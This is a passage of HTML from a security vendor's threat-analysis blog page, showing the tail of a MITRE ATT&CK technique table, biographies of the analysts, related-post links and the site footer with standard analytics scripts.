<td style="border: 0.98958pt solid #000000; width: 12.6761%; height: 175px;">
<p><span style="font-size: 12px;"><a href="https://attack.mitre.org/techniques/T1218/011/" rel="noopener" target="_blank">Signed Binary Proxy Execution: Rundll32</a></span></p>
</td>
<td style="border: 0.98958pt solid #000000; width: 11.9909%; height: 175px;">&nbsp;</td>
<td style="border: 0.98958pt solid #000000; width: 10.9631%; height: 175px;">
<p><span style="font-size: 12px;"><a href="https://attack.mitre.org/techniques/T1046/" rel="noopener" target="_blank">Network Service Scanning</a></span></p>
</td>
<td style="border: 0.98958pt solid #000000; width: 11.8767%; height: 175px;">&nbsp;</td>
<td style="border: 0.98958pt solid #000000; width: 11.0773%; height: 175px;">&nbsp;</td>
</tr>
<tr style="height: 139px;">
<td style="border: 0.98958pt solid #000000; width: 14.0464%; height: 139px;">&nbsp;</td>
<td style="border: 0.98958pt solid #000000; width: 15.0742%; height: 139px;">&nbsp;</td>
<td style="border: 0.98958pt solid #000000; width: 12.3335%; height: 139px;">&nbsp;</td>
<td style="border: 0.98958pt solid #000000; width: 12.6761%; height: 139px;">
<p><span style="font-size: 12px;"><a href="https://attack.mitre.org/techniques/T1112/" rel="noopener" target="_blank">Modify registry</a></span></p>
</td>
<td style="border: 0.98958pt solid #000000; width: 11.9909%; height: 139px;">&nbsp;</td>
<td style="border: 0.98958pt solid #000000; width: 10.9631%; height: 139px;">
<p><span style="font-size: 12px;"><a href="https://attack.mitre.org/techniques/T1018/" rel="noopener" target="_blank">Remote System Discovery</a></span></p>
</td>
<td style="border: 0.98958pt solid #000000; width: 11.8767%; height: 139px;">&nbsp;</td>
<td style="border: 0.98958pt solid #000000; width: 11.0773%; height: 139px;">&nbsp;</td>
</tr>
</tbody>
</table>
<p style="font-weight: normal;">&nbsp;</p>
<h2 style="font-weight: normal;">About the Researchers:</h2>
<p><strong><img class="no-border" src="https://www.cybereason.com/hs-fs/hubfs/image24-Feb-08-2022-11-08-45-43-PM.png?width=131&amp;name=image24-Feb-08-2022-11-08-45-43-PM.png" alt="image24-Feb-08-2022-11-08-45-43-PM" width="131" loading="lazy" style="width: 131px; float: left; margin: 0px 10px 1px 0px;" srcset="https://www.cybereason.com/hs-fs/hubfs/image24-Feb-08-2022-11-08-45-43-PM.png?width=66&amp;name=image24-Feb-08-2022-11-08-45-43-PM.png 66w, https://www.cybereason.com/hs-fs/hubfs/image24-Feb-08-2022-11-08-45-43-PM.png?width=131&amp;name=image24-Feb-08-2022-11-08-45-43-PM.png 131w, https://www.cybereason.com/hs-fs/hubfs/image24-Feb-08-2022-11-08-45-43-PM.png?width=197&amp;name=image24-Feb-08-2022-11-08-45-43-PM.png 197w, https://www.cybereason.com/hs-fs/hubfs/image24-Feb-08-2022-11-08-45-43-PM.png?width=262&amp;name=image24-Feb-08-2022-11-08-45-43-PM.png 262w, https://www.cybereason.com/hs-fs/hubfs/image24-Feb-08-2022-11-08-45-43-PM.png?width=328&amp;name=image24-Feb-08-2022-11-08-45-43-PM.png 328w, https://www.cybereason.com/hs-fs/hubfs/image24-Feb-08-2022-11-08-45-43-PM.png?width=393&amp;name=image24-Feb-08-2022-11-08-45-43-PM.png 393w" sizes="(max-width: 131px) 100vw, 131px">Eli Salem, Senior Security Analyst, Cybereason Global SOC</strong></p>
<p>Eli is a lead threat hunter and malware reverse engineer at Cybereason. He has worked in the private sector of the cyber security industry since 2017. In his free time, he publishes articles about malware research and threat hunting.</p>
<p><strong><img class="no-border" src="https://www.cybereason.com/hs-fs/hubfs/image7-Feb-08-2022-11-09-30-13-PM.png?width=133&amp;name=image7-Feb-08-2022-11-09-30-13-PM.png" alt="image7-Feb-08-2022-11-09-30-13-PM" width="133" loading="lazy" style="width: 133px; float: left; margin: 0px 10px 1px 0px;" srcset="https://www.cybereason.com/hs-fs/hubfs/image7-Feb-08-2022-11-09-30-13-PM.png?width=67&amp;name=image7-Feb-08-2022-11-09-30-13-PM.png 67w, https://www.cybereason.com/hs-fs/hubfs/image7-Feb-08-2022-11-09-30-13-PM.png?width=133&amp;name=image7-Feb-08-2022-11-09-30-13-PM.png 133w, https://www.cybereason.com/hs-fs/hubfs/image7-Feb-08-2022-11-09-30-13-PM.png?width=200&amp;name=image7-Feb-08-2022-11-09-30-13-PM.png 200w, https://www.cybereason.com/hs-fs/hubfs/image7-Feb-08-2022-11-09-30-13-PM.png?width=266&amp;name=image7-Feb-08-2022-11-09-30-13-PM.png 266w, https://www.cybereason.com/hs-fs/hubfs/image7-Feb-08-2022-11-09-30-13-PM.png?width=333&amp;name=image7-Feb-08-2022-11-09-30-13-PM.png 333w, https://www.cybereason.com/hs-fs/hubfs/image7-Feb-08-2022-11-09-30-13-PM.png?width=399&amp;name=image7-Feb-08-2022-11-09-30-13-PM.png 399w" sizes="(max-width: 133px) 100vw, 133px">Aleksandar Milenkoski, Senior Malware and Threat Analyst, Cybereason Global SOC</strong></p>
<p>Aleksandar Milenkoski is a Senior Malware and Threat Analyst with the Cybereason Global SOC team. He is involved primarily in reverse engineering and threat research activities. Aleksandar has a PhD in system security. For his research activities, he has been awarded by SPEC (Standard Performance Evaluation Corporation), the Bavarian Foundation for Science, and the University of Würzburg, Germany. Prior to Cybereason, his work focussed on research in intrusion detection and reverse engineering security mechanisms of the Windows operating system.</p>
<p><strong><img class="no-border" src="https://www.cybereason.com/hs-fs/hubfs/image8-Feb-08-2022-11-10-35-77-PM.png?width=136&amp;name=image8-Feb-08-2022-11-10-35-77-PM.png" alt="image8-Feb-08-2022-11-10-35-77-PM" width="136" loading="lazy" style="width: 136px; float: left; margin: 0px 10px 1px 0px;" srcset="https://www.cybereason.com/hs-fs/hubfs/image8-Feb-08-2022-11-10-35-77-PM.png?width=68&amp;name=image8-Feb-08-2022-11-10-35-77-PM.png 68w, https://www.cybereason.com/hs-fs/hubfs/image8-Feb-08-2022-11-10-35-77-PM.png?width=136&amp;name=image8-Feb-08-2022-11-10-35-77-PM.png 136w, https://www.cybereason.com/hs-fs/hubfs/image8-Feb-08-2022-11-10-35-77-PM.png?width=204&amp;name=image8-Feb-08-2022-11-10-35-77-PM.png 204w, https://www.cybereason.com/hs-fs/hubfs/image8-Feb-08-2022-11-10-35-77-PM.png?width=272&amp;name=image8-Feb-08-2022-11-10-35-77-PM.png 272w, https://www.cybereason.com/hs-fs/hubfs/image8-Feb-08-2022-11-10-35-77-PM.png?width=340&amp;name=image8-Feb-08-2022-11-10-35-77-PM.png 340w, https://www.cybereason.com/hs-fs/hubfs/image8-Feb-08-2022-11-10-35-77-PM.png?width=408&amp;name=image8-Feb-08-2022-11-10-35-77-PM.png 408w" sizes="(max-width: 136px) 100vw, 136px">Brian Janower, Security Analyst, Cybereason Global SOC</strong></p>
<p>Brian Janower is a Security Analyst with the Cybereason Global SOC team. He is involved in malware analysis and triages security incidents effectively and precisely. Brian has a deep understanding of the malicious operations prevalent in the current threat landscape. He is in the process of obtaining a Bachelor of Science degree in Systems Information &amp; Cyber.</p>
<p><strong><img class="no-border" src="https://www.cybereason.com/hs-fs/hubfs/image11-Feb-08-2022-11-11-24-06-PM.jpg?width=134&amp;name=image11-Feb-08-2022-11-11-24-06-PM.jpg" alt="image11-Feb-08-2022-11-11-24-06-PM" width="134" loading="lazy" style="width: 134px; float: left; margin: 0px 10px 1px 0px;" srcset="https://www.cybereason.com/hs-fs/hubfs/image11-Feb-08-2022-11-11-24-06-PM.jpg?width=67&amp;name=image11-Feb-08-2022-11-11-24-06-PM.jpg 67w, https://www.cybereason.com/hs-fs/hubfs/image11-Feb-08-2022-11-11-24-06-PM.jpg?width=134&amp;name=image11-Feb-08-2022-11-11-24-06-PM.jpg 134w, https://www.cybereason.com/hs-fs/hubfs/image11-Feb-08-2022-11-11-24-06-PM.jpg?width=201&amp;name=image11-Feb-08-2022-11-11-24-06-PM.jpg 201w, https://www.cybereason.com/hs-fs/hubfs/image11-Feb-08-2022-11-11-24-06-PM.jpg?width=268&amp;name=image11-Feb-08-2022-11-11-24-06-PM.jpg 268w, https://www.cybereason.com/hs-fs/hubfs/image11-Feb-08-2022-11-11-24-06-PM.jpg?width=335&amp;name=image11-Feb-08-2022-11-11-24-06-PM.jpg 335w, https://www.cybereason.com/hs-fs/hubfs/image11-Feb-08-2022-11-11-24-06-PM.jpg?width=402&amp;name=image11-Feb-08-2022-11-11-24-06-PM.jpg 402w" sizes="(max-width: 134px) 100vw, 134px">Yonatan Gidnian, Senior Security Analyst and Threat Hunter, Cybereason Global SOC</strong></p>
<p>Yonatan Gidnian is a Senior Security Analyst and Threat Hunter with the Cybereason Global SOC team. Yonatan analyses critical incidents and hunts for novel threats in order to build new detections. He began his career in the Israeli Air Force where he was responsible for protecting and maintaining critical infrastructures. Yonatan is passionate about malware analysis, digital forensics, and incident response.</p>
<p><span style="font-weight: bold;"><img src="https://www.cybereason.com/hs-fs/hubfs/Rotem.jpg?width=160&amp;name=Rotem.jpg" alt="Rotem" width="160" loading="lazy" style="width: 160px; float: left; margin: 0px 10px 0px 0px;" srcset="https://www.cybereason.com/hs-fs/hubfs/Rotem.jpg?width=80&amp;name=Rotem.jpg 80w, https://www.cybereason.com/hs-fs/hubfs/Rotem.jpg?width=160&amp;name=Rotem.jpg 160w, https://www.cybereason.com/hs-fs/hubfs/Rotem.jpg?width=240&amp;name=Rotem.jpg 240w, https://www.cybereason.com/hs-fs/hubfs/Rotem.jpg?width=320&amp;name=Rotem.jpg 320w, https://www.cybereason.com/hs-fs/hubfs/Rotem.jpg?width=400&amp;name=Rotem.jpg 400w, https://www.cybereason.com/hs-fs/hubfs/Rotem.jpg?width=480&amp;name=Rotem.jpg 480w" sizes="(max-width: 160px) 100vw, 160px">Rotem Rostami, Security Analyst, Cybereason Global SOC</span></p>
<p><span>Rotem Rostami is a Security Analyst with the Cybereason Global SOC (GSOC) team. She is involved in malware analysis activities and triages security incidents effectively and precisely. Rotem has a deep understanding of the malicious operations prevalent in the current threat landscape. Rotem has been working in the cybersecurity industry since 2018.</span></p></span>
          
          <!-- IOC PopUp Modal -->
          
          
          
          <!-- -->
          
          <!-- Social Share -->
          <div class="cr-blog-post__social-sharing">
            <span>Share</span>
            <div id="hs_cos_wrapper_module_161724375084957" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_module widget-type-social_sharing" style="" data-hs-cos-general-type="widget" data-hs-cos-type="module">






<div class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_social_sharing" data-hs-cos-general-type="widget" data-hs-cos-type="social_sharing">
  
	
  
    
    
    
			
		

    <a href="https://twitter.com/intent/tweet?original_referer=https://www.cybereason.com/blog/threat-analysis-report-all-paths-lead-to-cobalt-strike-icedid-emotet-and-qbot&amp;utm_medium=social&amp;utm_source=twitter&amp;url=https://www.cybereason.com/blog/threat-analysis-report-all-paths-lead-to-cobalt-strike-icedid-emotet-and-qbot&amp;utm_medium=social&amp;utm_source=twitter&amp;source=tweetbutton&amp;text=" target="_blank" rel="noopener" style="width:16px;">
      <img src="https://www.cybereason.com/hubfs/dam/images/images-web/blog-images/template-images/twitter-gray.svg" class="hs-image-widget hs-image-social-sharing-24" style="height:16px;width:16px;" width="16" hspace="0" alt="Share on twitter">
    </a>
	

  
	
  
    
    
    
			
		

    <a href="http://www.facebook.com/share.php?u=https://www.cybereason.com/blog/threat-analysis-report-all-paths-lead-to-cobalt-strike-icedid-emotet-and-qbot&amp;utm_medium=social&amp;utm_source=facebook" target="_blank" rel="noopener" style="width:16px;">
      <img src="https://www.cybereason.com/hubfs/dam/images/images-web/blog-images/template-images/facebook-gray.svg" class="hs-image-widget hs-image-social-sharing-24" style="height:16px;width:16px;" width="16" hspace="0" alt="Share on facebook">
    </a>
	

  
	
  
    
    
    
			
		

    <a href="http://www.linkedin.com/shareArticle?mini=true&amp;url=https://www.cybereason.com/blog/threat-analysis-report-all-paths-lead-to-cobalt-strike-icedid-emotet-and-qbot&amp;utm_medium=social&amp;utm_source=linkedin" target="_blank" rel="noopener" style="width:16px;">
      <img src="https://www.cybereason.com/hubfs/dam/images/images-web/blog-images/template-images/linkedin-gray.svg" class="hs-image-widget hs-image-social-sharing-24" style="height:16px;width:16px;" width="16" hspace="0" alt="Share on linkedin">
    </a>
	

</div></div>
          </div> 
          
          
          <!-- CONDITIONAL Author Box Display -->
            <div class="container columns cr-mln__author-listing-single">
              
                <div class="column headshot is-3-full-hd is-3-desktop is-3-tablet is-12-mobile">
                  <img class="cr-speaker-headshot" src="https://www.cybereason.com/hubfs/Capture-4.png" alt="Cybereason Global SOC Team">
                </div>
              
              <div class="column is-9-full-hd is-9-desktop is-12-mobile">
                <span class="descriptor">About the Author</span>
                <h4>Cybereason Global SOC Team</h4>
                
                
                
                  <p>The Cybereason Global SOC Team delivers 24/7 Managed Detection and Response services to customers on every continent. Led by cybersecurity experts with experience working for government, the military and multiple industry verticals, the Cybereason Global SOC Team continuously hunts for the most sophisticated and pervasive threats to support our mission to end cyberattacks on the endpoint, across the enterprise, and everywhere the battle moves.</p>
                
                
                  <a class="cr-button cr-button__min" href="https://www.cybereason.com/blog/authors/cybereason-global-soc-team">All Posts by Cybereason Global SOC Team</a>
                
              </div>            
            </div>
          
        <!-- CONDITIONAL Post Type Choices -->
        
        <!-- Malicious Life Post -->
        
        
        <!-- CISO Stories -->
        
        <!-- Webinar -->
        
          
        <!-- CONDITIONAL Transcript -->
          
        
         <!-- Related Posts -->
        <div id="hs_cos_wrapper_module_1649342860525315" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_module" style="" data-hs-cos-general-type="widget" data-hs-cos-type="module">
<section class="cr-section related-posts__wrapper">
  <div class="container container-is-blog page-center">
     <h3>Related Posts</h3>
     <div class="columns is-multiline">
       
  
 <div class="column is-6-fullhd is-6-desktop is-full-mobile blog-listing__single-post">
  <div class="text-content-bundle">
    <a href="https://www.cybereason.com/blog/threat-analysis-report-from-shatak-emails-to-the-conti-ransomware"><img src="https://www.cybereason.com/hubfs/Threat%20Alert%20template%20%284%29.png" alt="THREAT ANALYSIS REPORT: From Shathak Emails to the Conti Ransomware"></a>
    <h4><a href="https://www.cybereason.com/blog/threat-analysis-report-from-shatak-emails-to-the-conti-ransomware"><span class="underline">THREAT ANALYSIS REPORT: From Shathak Emails to the Conti Ransomware</span></a></h4>
     <p>The ITG23 group is partnering with the TA551 (Shatak) threat group to distribute ITG23’s TrickBot and BazarBackdoor malware which attackers use to deploy Conti ransomware on compromised systems...</p>
   </div>
 </div>


  
 <div class="column is-6-fullhd is-6-desktop is-full-mobile blog-listing__single-post">
  <div class="text-content-bundle">
    <a href="https://www.cybereason.com/blog/threat-analysis-from-icedid-to-domain-compromise"><img src="https://www.cybereason.com/hubfs/blog-post-text-Jan-06-2023-11-40-30-7591-PM.png" alt="THREAT ANALYSIS: From IcedID to Domain Compromise"></a>
    <h4><a href="https://www.cybereason.com/blog/threat-analysis-from-icedid-to-domain-compromise"><span class="underline">THREAT ANALYSIS: From IcedID to Domain Compromise</span></a></h4>
     <p>Recently, IcedID, also known as BokBot, has been used more as a dropper for other malware families and as a tool for initial access brokers.</p>
   </div>
 </div>



    </div>
  </div>
</section></div>
          
          
      </div>
        
        <!-- Sidebar -->

      <div class="column is-3-fullhd is-3-desktop is-12-mobile cr-malicious-life-network__sidebar">
        <div class="cr-ml-sidebar--group">
        <div class="top-stripe"></div>
        <div class="sidebar-block search-section">
          <form action="/hs-search-results">
            <input type="search" class="hs-search-field__input" name="term" autocomplete="on" placeholder="Search">
            <input type="hidden" name="type" value="BLOG_POST">
            <input type="hidden" name="type" value="LISTING_PAGE">
            <button type="submit" class="arrow"></button>
          </form>
        </div>
        <div class="sidebar-block subscribe">
          <a href="#blog-subscribe">
            <h4>Subscribe</h4>
            <span>Never miss a blog.</span>
          </a>
        </div>

        <div class="sidebar-block recent-posts">
          <h4>Recent Posts</h4>
          
            
                <div class="recent-posts__single-post">
                    <div class="text-content-bundle">
                        <a href="https://www.cybereason.com/blog/threat-alert-citrixbleed-cve-2023-4966" class="post-name"><span class="underline">THREAT ALERT: CITRIXBLEED (CVE-2023-4966)</span></a>
                       
                    </div>
                </div>
            
                <div class="recent-posts__single-post">
                    <div class="text-content-bundle">
                        <a href="https://www.cybereason.com/blog/threat-alert-djvu-variant-delivered-by-loader-masquerading-as-freeware" class="post-name"><span class="underline">THREAT ALERT: DJvu Variant Delivered by Loader Masquerading as Freeware</span></a>
                       
                    </div>
                </div>
            
                <div class="recent-posts__single-post">
                    <div class="text-content-bundle">
                        <a href="https://www.cybereason.com/blog/2024-cybersecurity-predictions-generative-ai-reshapes-cybersecurity" class="post-name"><span class="underline">2024 Cybersecurity Predictions - Generative AI Reshapes Cybersecurity</span></a>
                       
                    </div>
                </div>
            
        </div>

        <div class="sidebar-block category-listing">
          <h4>Categories</h4>
          <ul>
            <li><a href="https://www.cybereason.com/blog/category/research">Research</a></li>
            <li><a href="https://www.cybereason.com/blog/category/podcasts">Podcasts</a></li>
            <li><a href="https://www.cybereason.com/blog/category/webinars">Webinars</a></li>
            <li><a href="https://www.cybereason.com/blog/category/resources">Resources</a></li>
            <li><a href="https://www.cybereason.com/blog/category/videos">Videos</a></li>
            <li><a href="https://www.cybereason.com/blog/category/news">News</a></li>
          </ul>

          <a class="rec-category__single--view-all" href="/blog/category/research">All Posts</a>
        </div>

        
      </div><!-- END .rec-categories__all -->
      
      
      
    </div>
       
    </div>
  </div>
</div></div>

</div><!--end row-->
</div><!--end row-wrapper -->

<div class="row-fluid-wrapper row-depth-1 row-number-2 ">
<div class="row-fluid ">
<div class="span12 widget-span widget-type-custom_widget " style="display: none;" data-widget-type="custom_widget" data-x="0" data-w="12">
<div id="hs_cos_wrapper_module_1616011887658867" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_module" style="" data-hs-cos-general-type="widget" data-hs-cos-type="module">
<section class="cr-section related-posts__wrapper">
  <div class="container container-is-blog page-center">
     <h3>Related Posts</h3>
     <div class="columns is-multiline">
       
  
 <div class="column is-6-fullhd is-6-desktop is-full-mobile blog-listing__single-post">
  <div class="text-content-bundle">
    <a href="https://www.cybereason.com/blog/threat-analysis-report-from-shatak-emails-to-the-conti-ransomware"><img src="https://www.cybereason.com/hubfs/Threat%20Alert%20template%20%284%29.png" alt="THREAT ANALYSIS REPORT: From Shathak Emails to the Conti Ransomware"></a>
    <h4><a href="https://www.cybereason.com/blog/threat-analysis-report-from-shatak-emails-to-the-conti-ransomware"><span class="underline">THREAT ANALYSIS REPORT: From Shathak Emails to the Conti Ransomware</span></a></h4>
     <p>The ITG23 group is partnering with the TA551 (Shatak) threat group to distribute ITG23’s TrickBot and BazarBackdoor malware which attackers use to deploy Conti ransomware on compromised systems...</p>
   </div>
 </div>


  
 <div class="column is-6-fullhd is-6-desktop is-full-mobile blog-listing__single-post">
  <div class="text-content-bundle">
    <a href="https://www.cybereason.com/blog/threat-analysis-from-icedid-to-domain-compromise"><img src="https://www.cybereason.com/hubfs/blog-post-text-Jan-06-2023-11-40-30-7591-PM.png" alt="THREAT ANALYSIS: From IcedID to Domain Compromise"></a>
    <h4><a href="https://www.cybereason.com/blog/threat-analysis-from-icedid-to-domain-compromise"><span class="underline">THREAT ANALYSIS: From IcedID to Domain Compromise</span></a></h4>
     <p>Recently, IcedID, also known as BokBot, has been used more as a dropper for other malware families and as a tool for initial access brokers.</p>
   </div>
 </div>



    </div>
  </div>
</section></div>

</div><!--end widget-span -->
</div><!--end row-->
</div><!--end row-wrapper -->

<div class="row-fluid-wrapper row-depth-1 row-number-3 ">
<div class="row-fluid ">
<div class="span12 widget-span widget-type-custom_widget " style="" data-widget-type="custom_widget" data-x="0" data-w="12">
<div id="hs_cos_wrapper_module_161767462015235" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_module widget-type-blog_subscribe" style="" data-hs-cos-general-type="widget" data-hs-cos-type="module"><div class="cr-mln__blog-listing-page__subscribe-footer">
  <div class="container container-is-blog columns page-center">
    <div class="column is-8-fullhd is-8-desktop is-10-tablet is-12-mobile">
      <span class="tag">NEWSLETTER</span>
      <h3>Never miss a blog</h3>
      <p>Get the latest research, expert insights, and security industry news.</p>
      <a class="cr-button cr-mln__subscribe" href="#blog-subscribe">Subscribe</a>
    </div>
    <!--<div class="column is-5-fullhd is-5-desktop is-half-tablet is-12-mobile is-offset-1-fullhd is-offset-1-desktop">
      <div class="inputs-wrapper">
        
        
      </div>
    </div>-->
  </div>
</div></div>

</div><!--end widget-span -->
</div><!--end row-->
</div><!--end row-wrapper -->

<div class="row-fluid-wrapper row-depth-1 row-number-4 ">
<div class="row-fluid ">
<div class="span12 widget-span widget-type-custom_widget " style="" data-widget-type="custom_widget" data-x="0" data-w="12">
<div id="hs_cos_wrapper_module_166508001252918" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_module" style="" data-hs-cos-general-type="widget" data-hs-cos-type="module"><div class="cr-sticky-cta-bar bg-black" id="sticky-bar">
  <div class="content">
    <span>Want to see the Cybereason Defense Platform in action?</span>
    <a class="cr-button cr-button__fill-yellow" href="https://www.cybereason.com/request-a-demo" target="_blank">Schedule a Demo</a>
  </div>
  <div class="close">X</div>
</div></div>

</div><!--end widget-span -->
</div><!--end row-->
</div><!--end row-wrapper -->

    </div><!--end body -->
</div><!--end body wrapper -->

<div class="footer-container-wrapper">
    <div class="footer-container container-fluid">

<div class="row-fluid-wrapper row-depth-1 row-number-1 ">
<div class="row-fluid ">
<div class="span12 widget-span widget-type-custom_widget " style="" data-widget-type="custom_widget" data-x="0" data-w="12">
<div id="hs_cos_wrapper_module_16036762394194314" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_module" style="" data-hs-cos-general-type="widget" data-hs-cos-type="module"><!-- FOOTER -->

<footer class="cr-section cr-footer cr-footer__full">
    <div class="container page-center">
      <div class="columns">
          <div class="column is-6-fullhd is-5-desktop cr-footer__col cr-footer__left">
            <div class="cr-footer__Left-logo">
              
                <a href="https://www.cybereason.com">
                  
                <img src="https://www.cybereason.com/hubfs/dam/images/images-web/logos/cr-brand/cr-logo-inline--primary-white.png">
              </a>
            </div>
          </div>
          <div class="columns column is-6-fullhd is-6-desktop cr-footer__col cr-footer__right">
            <div class="cr-footer__links-list column">
              <h4>About</h4>
              <ul>
                <li><a href="https://www.cybereason.com/company/who-we-are">Who We Are</a>
                </li><li><a href="https://www.cybereason.com/company/careers">Careers</a>
          <!-- </li><li><a href="https://www.cybereason.com/company/leadership">Leadership</a> --->
                </li><li><a href="https://www.cybereason.com/company/contact-us">Contact</a>
              </li></ul>
            </div>
            <div class="cr-footer__links-list column">
              <h4>Resources</h4>
              <ul>
                <li><a href="https://www.cybereason.com/blog">Blog</a></li>
                <li><a href="https://www.cybereason.com/resources/tag/case-study">Case Studies</a></li>
                <li><a href="https://www.cybereason.com/resources/tag/webinars">Webinars</a></li>
                <li><a href="https://www.cybereason.com/resources/tag/white-papers">White Papers</a></li>
             </ul>
            </div>
            <div class="cr-footer__links-list column">
              <h4>Platform</h4>
              <ul>
                
                <li><a href="https://www.cybereason.com/platform">Overview</a></li>
                <li><a href="https://www.cybereason.com/platform/endpoint-prevention">Endpoint Protection</a></li>
                <li><a href="https://www.cybereason.com/platform/endpoint-detection-response-edr">EDR</a></li>
                <li><a href="https://www.cybereason.com/platform/managed-detection-response-mdr">MDR</a></li>
              </ul>
            </div>
          </div>
      </div>
    </div>
  
    <div class="container page-center">
      <div class="columns cr-footer__bottom-bar">
        <div class="column">
          <p>©Cybereason 2023. All Rights Reserved.</p>
        </div>
        <div class="column bottom-bar__links">
          <ul>
            <li><a href="https://www.cybereason.com/terms-of-use">Terms of Use</a></li>
            <li><a href="https://www.cybereason.com/privacy-notice">Privacy Notice</a></li>
            <li><a href="https://www.cybereason.com/ccpa-privacy-request">Do Not Sell</a></li>
            <li><a href="https://www.cybereason.com/security">Security</a></li>
            <!--<li><a href="#">Cookie Policy</a></li>-->
          </ul>
        </div>

        <div class="column bottom-bar__social">
          <ul>
            <li><a class="facebook" href="https://www.facebook.com/Cybereason/"></a></li>
            <li><a class="twitter" href="https://twitter.com/cybereason"></a></li>
            <li><a class="youtube" href="https://www.youtube.com/channel/UCOm7AaB0HiNH4Phe66sK0Ew"></a></li>
            <li><a class="linkedin" href="https://www.linkedin.com/company/cybereason"></a></li>
            <li><a class="instagram" href="https://www.instagram.com/cybereason"></a></li>
          </ul>
        </div>
    </div>
  </div>

</footer></div>

</div><!--end widget-span -->
</div><!--end row-->
</div><!--end row-wrapper -->

    </div><!--end footer -->
</div><!--end footer wrapper -->

    
<!-- HubSpot performance collection script -->
<script defer src="https://static.hsappstatic.net/content-cwv-embed/static-1.388/embed.js"></script>
<script src="//cdn2.hubspot.net/hub/3354902/hub_generated/template_assets/42507089303/1644440411417/__CR_Web_Platform/JS/animatedModal/animatedModal.min.js"></script>
<script>
var hsVars = hsVars || {}; hsVars['language'] = 'en';
</script>

<script src="/hs/hsstatic/cos-i18n/static-1.53/bundles/project.js"></script>
<script src="https://cdn2.hubspot.net/hub/3354902/hub_generated/module_assets/41681847227/1644941386128/module_41681847227_CR_-_Malicious_Life_Network_--_Tier_One_Header.min.js"></script>
<script src="https://cdn2.hubspot.net/hub/3354902/hub_generated/module_assets/41682410610/1644941443113/module_41682410610_CR_-_Malicious_Life_Network_--_Main_Hero.min.js"></script>
<script src="https://cdn2.hubspot.net/hub/3354902/hub_generated/module_assets/43300360745/1649424828285/module_43300360745_CR_-_Malicious_Life_Network_--_Related_Posts.min.js"></script>
<script src="https://cdn2.hubspot.net/hub/3354902/hub_generated/module_assets/86933076631/1669911113440/module_86933076631_CR_-_Sticky_CTA_Bar.min.js"></script>

<!-- Start of HubSpot Analytics Code -->
<script type="text/javascript">
var _hsq = _hsq || [];
_hsq.push(["setContentType", "blog-post"]);
_hsq.push(["setCanonicalUrl", "https:\/\/www.cybereason.com\/blog\/threat-analysis-report-all-paths-lead-to-cobalt-strike-icedid-emotet-and-qbot"]);
_hsq.push(["setPageId", "65794753062"]);
_hsq.push(["setContentMetadata", {
    "contentPageId": 65794753062,
    "legacyPageId": "65794753062",
    "contentFolderId": null,
    "contentGroupId": 5272851739,
    "abTestId": null,
    "languageVariantId": 65794753062,
    "languageCode": "en",
    
}]);
</script>

<script type="text/javascript" id="hs-script-loader" async defer src="/hs/scriptloader/3354902.js"></script>
<!-- End of HubSpot Analytics Code -->


<script type="text/javascript">
var hsVars = {
    render_id: "5c8df86c-6581-48f2-895d-d96b3cb11ed8",
    ticks: 1704072644645,
    page_id: 65794753062,
    
    content_group_id: 5272851739,
    portal_id: 3354902,
    app_hs_base_url: "https://app.hubspot.com",
    cp_hs_base_url: "https://cp.hubspot.com",
    language: "en",
    analytics_page_type: "blog-post",
    analytics_page_id: "65794753062",
    category_id: 3,
    folder_id: 0,
    is_hubspot_user: false
}
</script>


<script defer src="/hs/hsstatic/HubspotToolsMenu/static-1.191/js/index.js"></script>

<script>if ($('[id^="hs_form"]').length > 0) {
  var myInterval = setInterval(
  function() {
    var myFields = document.getElementsByClassName('hs-input');
    if (myFields.length > 0) {
      clearInterval(myInterval);
      for (var i = 0; i < myFields.length; i++) {
        var myField = myFields[i];
		var myTagName = myField.tagName.toLowerCase();
        if (myTagName == 'input' || myTagName == 'textarea') {
          if (myField.placeholder != null) {
            myField.placeholder = myField.placeholder.replace('*', '');
          }
        } else if (myTagName == 'select') {
          myField.options[0].innerHTML = myField.options[0].innerHTML.replace('*', '');
        }
      }
    }
  }, 100);
}
</script>

<div id="fb-root"></div>
 <script>(function(d, s, id) {
  var js, fjs = d.getElementsByTagName(s)[0];
  if (d.getElementById(id)) return;
  js = d.createElement(s); js.id = id;
  js.src = "//connect.facebook.net/en_GB/all.js#xfbml=1&status=0";
  fjs.parentNode.insertBefore(js, fjs);
}(document, 'script', 'facebook-jssdk'));</script>
 <script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="https://platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}}(document,"script","twitter-wjs");</script>
 


    <script>
function sticky_relocate() {
  var window_top = $(window).scrollTop();
  var div_top = $('#sticky-anchor').offset().top;
  if (window_top > div_top) {
    $('#sticky').addClass('stick');
  } else {
    $('#sticky').removeClass('stick');
  }
}

$(function() {
  $(window).scroll(sticky_relocate);
  sticky_relocate();
});
</script>
    <!-- Generated by the HubSpot Template Builder - template version 1.03 -->

</body></html>